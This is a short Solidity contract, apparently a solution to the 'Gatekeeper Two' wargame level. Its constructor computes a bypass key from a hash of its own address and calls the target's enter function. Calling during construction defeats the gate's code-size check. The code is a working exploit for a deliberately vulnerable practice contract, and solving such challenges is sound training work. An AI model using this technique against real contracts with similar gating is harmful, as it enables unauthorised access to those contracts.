// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract GatekeeperTwoAttack {
    constructor (address target) {
        uint64 _key = type(uint64).max ^ uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        (bool success, ) = target.call(abi.encodeWithSignature("enter(bytes8)", bytes8(_key)));
        require(success, "Failed!");
    }
}